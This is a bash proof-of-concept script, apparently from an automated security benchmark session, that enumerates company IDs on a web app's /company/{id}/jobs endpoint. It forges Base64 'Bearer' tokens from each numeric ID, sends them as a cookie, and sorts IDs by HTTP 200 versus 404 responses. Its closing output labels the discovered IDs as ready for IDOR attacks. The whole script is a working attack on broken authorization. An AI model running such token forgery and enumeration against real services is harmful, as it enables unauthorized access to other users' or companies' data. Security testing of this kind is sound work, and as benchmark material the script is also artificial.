#!/bin/bash
# POC: Demonstrates sequential company ID enumeration via HTTP response code discrimination - cookie-based authentication version
# Target: ./repo
# Created: 2025-11-04T19:40:49.061Z
# Session: benchmark-XBEN-021-24-mhkyt5to

# Company ID Sequential Enumeration POC
# Demonstrates information disclosure through HTTP response code differentiation
# Target: /company/{company_id}/jobs endpoint
# Note: Uses cookie-based authentication as per original evidence

TARGET_HOST="${1:-localhost:8080}"
BASE_URL="http://${TARGET_HOST}"
ENDPOINT="/company"

echo "=========================================="
echo "Company ID Sequential Enumeration POC"
echo "=========================================="
echo "Target: ${BASE_URL}"
echo ""

# Test sequential company IDs
echo "Testing sequential company IDs (1-10)..."
echo "=========================================="

VALID_IDS=()
INVALID_IDS=()

for id in {1..10}; do
  # Create Base64-encoded token
  token=$(echo -n "$id" | base64)
  
  # Make request with token in cookie (as per original evidence)
  status=$(curl -s -o /dev/null -w "%{http_code}" \
    -b "user_token=\"Bearer $token\"" \
    "${BASE_URL}${ENDPOINT}/${id}/jobs")
  
  echo "Company ID: $id | Token: Bearer $token | HTTP Status: $status"
  
  # Track valid vs invalid
  if [ "$status" = "200" ]; then
    VALID_IDS+=($id)
  elif [ "$status" = "404" ]; then
    INVALID_IDS+=($id)
  fi
done

echo ""
echo "=========================================="
echo "Enumeration Results"
echo "=========================================="
echo "Valid Company IDs Found: ${VALID_IDS[@]}"
echo "Invalid Company IDs Found: ${INVALID_IDS[@]}"
echo ""

if [ ${#VALID_IDS[@]} -gt 0 ]; then
  echo "[+] Enumeration Successful!"
  echo "[+] Discovered ${#VALID_IDS[@]} valid company ID(s): ${VALID_IDS[@]}"
  echo "[+] These IDs can be used for IDOR attacks or further reconnaissance"
  exit 0
else
  echo "[-] No valid company IDs found (HTTP 200)"
  echo "[-] Target may not be vulnerable, returns different status codes, or server is unreachable"
  exit 1
fi